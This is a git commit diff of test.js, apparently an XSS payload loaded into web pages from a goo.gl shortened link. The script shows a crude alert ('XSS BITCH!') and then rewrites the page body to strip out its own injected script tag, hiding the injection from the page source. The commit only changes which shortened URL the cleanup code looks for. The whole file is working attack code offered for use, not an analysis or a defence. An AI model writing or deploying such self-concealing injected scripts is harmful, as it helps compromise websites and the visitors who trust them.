659a2e034ef66d895a1b0943b412fdc19263697b
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-03-06 23:15:45 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,11 +1,13 @@
 alert("XSS BITCH!");
 
+//var script = document.querySelector("script[src='//goo.gl/GFfRmX']")
+
 var script = document.currentScript;
 
 var oldHtml = document.body.innerHTML;
 
-var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/GFfRmX\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
+var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
 
-document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/GFfRmX\">".length )
+document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length )
 
 document.body.innerHTML = newHtml;
